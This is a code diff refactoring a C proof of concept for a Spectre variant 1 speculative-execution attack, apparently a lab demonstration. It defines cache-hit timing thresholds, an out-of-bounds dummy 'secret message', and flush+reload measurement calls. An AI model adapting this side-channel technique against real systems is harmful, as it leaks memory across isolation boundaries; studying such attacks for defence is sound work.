@@ -3,9 +3,21 @@
 #include <time.h>
 
 #include "config.h"
-#include "gen_array.c"
-#include "time_and_flush.c"
-#include "print_results.c"
+#include "../lib/gen_array.c"
+#include "../lib/time_and_flush.c"
+#include "../lib/print_results.c"
+
+
+#define N_PAGES 256
+#define REPETITIONS 10
+#define CACHE_HIT 75
+#define MAYBE_CACHE_HIT 175
+
+const int data_size = 35;
+int accessible = 100;
+int secret_size = 25;
+unsigned char* data = "notasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretnotasecretzhis is a secret message";
+
 
 __attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* data) {
 
@@ -22,8 +34,8 @@ __attribute__((noinline)) void victim_func(int index, cp_t* arr, unsigned char* 
 
 int* spv1(int index) {
 
-    cp_t* arr = mmap_arr_cache_pages();
-    flush_arr((void*)arr);
+    cp_t* arr = mmap_arr_cache_pages(N_PAGES);
+    flush_arr((void*)arr, N_PAGES);
 
 
     //access decisions in array, repeated out-of-bounds not traceable for branch predictor
@@ -44,8 +56,8 @@ int* spv1(int index) {
     __sync_synchronize();
 
     //time loading duration per array index
-    int* results = reload(arr);
-    unmap_cache_pages(arr);
+    int* results = reload(arr, N_PAGES, CACHE_HIT, MAYBE_CACHE_HIT);
+    unmap_cache_pages(arr, N_PAGES);
     return results;
 }
 
@@ -53,7 +65,7 @@ int* spv1(int index) {
 
 int main(int argc, char* argv[]) {
 
-    int*** results = alloc_results(); //results[REPETITIONS][secret_size][N_PAGES]ints
+    int*** results = alloc_results(REPETITIONS, secret_size, N_PAGES); //results[REPETITIONS][secret_size][N_PAGES]ints
 
     for(int r = 0; r < REPETITIONS; r++) {
 
@@ -62,7 +74,7 @@ int main(int argc, char* argv[]) {
             __sync_synchronize();
         }
     }
-    print_results(results);
+    print_results(results, REPETITIONS, secret_size, N_PAGES, CACHE_HIT);
 
-    free_results(results);
+    free_results(results, REPETITIONS, secret_size);
 }
